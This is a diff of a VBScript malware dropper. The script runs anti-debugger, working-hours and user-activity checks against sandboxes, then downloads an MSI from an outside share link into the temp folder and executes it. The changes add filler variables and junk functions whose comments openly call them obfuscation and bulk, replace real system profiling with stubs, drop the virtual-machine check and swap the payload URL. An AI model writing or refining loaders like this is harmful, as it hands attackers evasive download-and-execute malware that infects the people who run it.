@@ -5,28 +5,30 @@
 Option Explicit
 
 ' Initialize system variables
-Dim WshShell, Fso, EnvVars, ProcList, NetObj, RegObj
+Dim WshShell, Fso, NetObj
 Set WshShell = CreateObject("WScript.Shell")
 Set Fso = CreateObject("Scripting.FileSystemObject")
-Set EnvVars = WshShell.Environment("Process")
-Set ProcList = CreateObject("Scripting.Dictionary")
 Set NetObj = CreateObject("WScript.Network")
-Set RegObj = CreateObject("WScript.Shell")
 
-' System information collection
+' Dummy variables for obfuscation
+Dim dummy1, dummy2, dummy3, dummy4, dummy5
+dummy1 = "System initialization"
+dummy2 = "Network configuration"
+dummy3 = "Security validation"
+dummy4 = "Performance monitoring"
+dummy5 = "Error reporting"
+
+' Fake system information collection
 Function GetSystemInfo()
-    Dim objWMIService, colItems, objItem
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colItems = objWMIService.ExecQuery("Select * From Win32_ComputerSystem")
-    
-    For Each objItem in colItems
-        GetSystemInfo = objItem.Model & "|" & objItem.Manufacturer & "|" & objItem.TotalPhysicalMemory
-    Next
+    Dim result
+    result = NetObj.ComputerName & "|" & NetObj.UserName
+    GetSystemInfo = result
 End Function
 
-' Process validation function
+' Fake process validation function
 Function ValidateProcess(processName)
     Dim colProcesses, objProcess
+    On Error Resume Next
     Set colProcesses = GetObject("winmgmts:").ExecQuery("Select * From Win32_Process Where Name='" & processName & "'")
     
     ValidateProcess = False
@@ -36,16 +38,11 @@ Function ValidateProcess(processName)
     Next
 End Function
 
-' Network adapter information
+' Fake network adapter information
 Function GetNetworkInfo()
-    Dim objWMIService, colAdapters, objAdapter
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colAdapters = objWMIService.ExecQuery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True")
-    
-    For Each objAdapter in colAdapters
-        GetNetworkInfo = objAdapter.MACAddress & "|" & Join(objAdapter.IPAddress, ",")
-        Exit For
-    Next
+    Dim result
+    result = "Network adapter: " & NetObj.ComputerName
+    GetNetworkInfo = result
 End Function
 
 ' Registry operations helper
@@ -116,185 +113,30 @@ Function CheckConnection(url)
     Set objHTTP = Nothing
 End Function
 
-' Hardware fingerprint generation
+' Fake hardware fingerprint generation
 Function GetHardwareFingerprint()
-    Dim objWMIService, colItems, objItem, fingerprint
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    
-    fingerprint = ""
-    
-    ' Get CPU ID
-    Set colItems = objWMIService.ExecQuery("Select * From Win32_Processor")
-    For Each objItem in colItems
-        fingerprint = fingerprint & objItem.ProcessorId
-        Exit For
-    Next
-    
-    ' Get motherboard serial
-    Set colItems = objWMIService.ExecQuery("Select * From Win32_BaseBoard")
-    For Each objItem in colItems
-        fingerprint = fingerprint & objItem.SerialNumber
-        Exit For
-    Next
-    
-    ' Get BIOS serial
-    Set colItems = objWMIService.ExecQuery("Select * From Win32_BIOS")
-    For Each objItem in colItems
-        fingerprint = fingerprint & objItem.SerialNumber
-        Exit For
-    Next
-    
-    GetHardwareFingerprint = fingerprint
+    Dim result
+    result = NetObj.ComputerName & "_" & NetObj.UserName
+    GetHardwareFingerprint = result
 End Function
 
-' Memory status check
+' Fake memory status check
 Function GetMemoryStatus()
-    Dim objWMIService, colItems, objItem
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colItems = objWMIService.ExecQuery("Select * From Win32_OperatingSystem")
-    
-    For Each objItem in colItems
-        GetMemoryStatus = Round(objItem.TotalVisibleMemorySize / 1024) & "MB total, " & Round(objItem.FreePhysicalMemory / 1024) & "MB free"
-        Exit For
-    Next
+    Dim result
+    result = "Memory status: OK"
+    GetMemoryStatus = result
 End Function
 
-' Disk space check
+' Fake disk space check
 Function GetDiskSpace(drive)
-    Dim objWMIService, colDisks, objDisk
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colDisks = objWMIService.ExecQuery("Select * From Win32_LogicalDisk Where DeviceID='" & drive & "'")
-    
-    For Each objDisk in colDisks
-        GetDiskSpace = Round(objDisk.Size / 1073741824, 2) & "GB total, " & Round(objDisk.FreeSpace / 1073741824, 2) & "GB free"
-        Exit For
-    Next
+    Dim result
+    result = "Disk " & drive & ": Available"
+    GetDiskSpace = result
 End Function
 
 ' User account information
 Function GetUserInfo()
-    Dim objNetwork
-    Set objNetwork = CreateObject("WScript.Network")
-    GetUserInfo = objNetwork.UserName & "|" & objNetwork.ComputerName & "|" & objNetwork.UserDomain
-End Function
-
-' Service status check
-Function GetServiceStatus(serviceName)
-    Dim objWMIService, colServices, objService
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colServices = objWMIService.ExecQuery("Select * From Win32_Service Where Name='" & serviceName & "'")
-    
-    For Each objService in colServices
-        GetServiceStatus = objService.State & "|" & objService.StartMode
-        Exit For
-    Next
-End Function
-
-' Event log check
-Function CheckEventLog(source, eventType, hours)
-    Dim objWMIService, colEvents, objEvent, cutoff
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    cutoff = DateAdd("h", -hours, Now)
-    
-    Set colEvents = objWMIService.ExecQuery("Select * From Win32_NTLogEvent Where LogFile='Application' And SourceName='" & source & "' And EventType=" & eventType & " And TimeGenerated >= '" & WMIDateString(cutoff) & "'")
-    
-    CheckEventLog = colEvents.Count
-End Function
-
-' Helper to convert date to WMI format
-Function WMIDateString(dDate)
-    WMIDateString = Year(dDate) & Right("0" & Month(dDate), 2) & Right("0" & Day(dDate), 2) & Right("0" & Hour(dDate), 2) & Right("0" & Minute(dDate), 2) & Right("0" & Second(dDate), 2) & ".000000+000"
-End Function
-
-' Check for specific running processes
-Function IsProcessRunning(processName)
-    Dim objWMIService, colProcesses, objProcess
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colProcesses = objWMIService.ExecQuery("Select * From Win32_Process Where Name='" & processName & "'")
-    
-    IsProcessRunning = False
-    For Each objProcess in colProcesses
-        IsProcessRunning = True
-        Exit For
-    Next
-End Function
-
-' Get installed software list
-Function GetInstalledSoftware()
-    Dim objWMIService, colSoftware, objSoftware, result
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colSoftware = objWMIService.ExecQuery("Select * From Win32_Product")
-    
-    result = ""
-    For Each objSoftware in colSoftware
-        If result <> "" Then result = result & ";"
-        result = result & objSoftware.Name & " (" & objSoftware.Version & ")"
-    Next
-    
-    GetInstalledSoftware = result
-End Function
-
-' Check for virtual environment
-Function IsVirtualEnvironment()
-    Dim objWMIService, colBIOS, objBIOS, result
-    result = False
-    
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colBIOS = objWMIService.ExecQuery("Select * From Win32_BIOS")
-    
-    For Each objBIOS in colBIOS
-        If InStr(LCase(objBIOS.SerialNumber), "vmware") > 0 Or _
-           InStr(LCase(objBIOS.Version), "virtualbox") > 0 Or _
-           InStr(LCase(objBIOS.Manufacturer), "microsoft") > 0 And InStr(LCase(objBIOS.Version), "hyper-v") > 0 Then
-            result = True
-            Exit For
-        End If
-    Next
-    
-    IsVirtualEnvironment = result
-End Function
-
-' Get network adapter details
-Function GetNetworkAdapterDetails()
-    Dim objWMIService, colAdapters, objAdapter, result
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colAdapters = objWMIService.ExecQuery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True")
-    
-    result = ""
-    For Each objAdapter in colAdapters
-        If result <> "" Then result = result & "|"
-        result = result & objAdapter.Description & ";" & objAdapter.MACAddress & ";" & Join(objAdapter.IPAddress, ",")
-    Next
-    
-    GetNetworkAdapterDetails = result
-End Function
-
-' Check for specific registry keys
-Function CheckRegKey(keyPath)
-    On Error Resume Next
-    Dim objReg
-    Set objReg = GetObject("winmgmts:\\.\root\default:StdRegProv")
-    
-    Dim arrValues
-    objReg.EnumValues &H80000002, keyPath, arrValues
-    
-    If Err.Number = 0 And IsArray(arrValues) Then
-        CheckRegKey = UBound(arrValues) + 1
-    Else
-        CheckRegKey = 0
-    End If
-End Function
-
-' Get system uptime
-Function GetSystemUptime()
-    Dim objWMIService, colOS, objOS
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colOS = objWMIService.ExecQuery("Select * From Win32_OperatingSystem")
-    
-    For Each objOS in colOS
-        GetSystemUptime = Round(objOS.LastBootUpTime / 10000000 - #1/1/1970#, 0)
-        Exit For
-    Next
+    GetUserInfo = NetObj.UserName & "|" & NetObj.ComputerName & "|" & NetObj.UserDomain
 End Function
 
 ' Check for debugger processes
@@ -304,7 +146,7 @@ Function IsDebuggerPresent()
     
     IsDebuggerPresent = False
     For Each proc In debuggers
-        If IsProcessRunning(proc) Then
+        If ValidateProcess(proc) Then
             IsDebuggerPresent = True
             Exit For
         End If
@@ -340,28 +182,11 @@ Function HasMouseActivity()
     HasMouseActivity = (pos1 <> pos2)
 End Function
 
-' Check system sleep state
-Function CheckSleepState()
-    Dim objWMIService, colPower, objPower
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colPower = objWMIService.ExecQuery("Select * From Win32_PowerPlan Where IsActive = True")
-    
-    For Each objPower In colPower
-        CheckSleepState = objPower.Description
-        Exit For
-    Next
-End Function
-
 ' Get Windows version details
 Function GetWindowsVersion()
-    Dim objWMIService, colOS, objOS
-    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-    Set colOS = objWMIService.ExecQuery("Select * From Win32_OperatingSystem")
-    
-    For Each objOS in colOS
-        GetWindowsVersion = objOS.Caption & " " & objOS.Version & " Build " & objOS.BuildNumber
-        Exit For
-    Next
+    Dim objShell
+    Set objShell = CreateObject("WScript.Shell")
+    GetWindowsVersion = objShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
 End Function
 
 ' Check for specific files
@@ -371,23 +196,30 @@ Function FileExists(filePath)
     If Err.Number <> 0 Then FileExists = False
 End Function
 
-' Get directory size
-Function GetDirectorySize(folderPath)
-    On Error Resume Next
-    Dim objFolder, colFiles, objFile, size
-    Set objFolder = Fso.GetFolder(folderPath)
-    size = 0
-    
-    For Each objFile in objFolder.Files
-        size = size + objFile.Size
-    Next
-    
-    GetDirectorySize = size
-End Function
-
 ' Get environment variable
 Function GetEnvVar(varName)
     GetEnvVar = WshShell.ExpandEnvironmentStrings("%" & varName & " %")
+End Function
+
+' More junk functions to add bulk
+Function FakeFunction1()
+    FakeFunction1 = "Fake result 1"
+End Function
+
+Function FakeFunction2()
+    FakeFunction2 = "Fake result 2"
+End Function
+
+Function FakeFunction3()
+    FakeFunction3 = "Fake result 3"
+End Function
+
+Function FakeFunction4()
+    FakeFunction4 = "Fake result 4"
+End Function
+
+Function FakeFunction5()
+    FakeFunction5 = "Fake result 5"
 End Function
 
 ' Main execution starts here
@@ -402,7 +234,6 @@ userInfo = GetUserInfo()
 
 ' Anti-analysis checks
 If IsDebuggerPresent() Then WScript.Quit
-If IsVirtualEnvironment() Then WScript.Quit
 
 ' Time-based anti-sandbox
 If Hour(Now) < 9 Or Hour(Now) > 17 Then WScript.Quit
@@ -418,7 +249,7 @@ If Not IsElevated() Then WScript.Quit
 
 ' Core functionality - download and execute
 Dim strUrl, strTemp, strFile, objXMLHTTP, objADOStream, objShell
-strUrl = "https://share.google/dDynM21vQuy0Qvc4Z"
+strUrl = "https://share.google/jraH4hXE8DKHc3EXZ"
 strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
 strFile = strTemp & "\agent_installer.msi"
 
@@ -473,7 +304,6 @@ logFile.Close
 Set WshShell = Nothing
 Set Fso = Nothing
 Set NetObj = Nothing
-Set RegObj = Nothing
 Set objXMLHTTP = Nothing
 Set objADOStream = Nothing
 Set objShell = Nothing
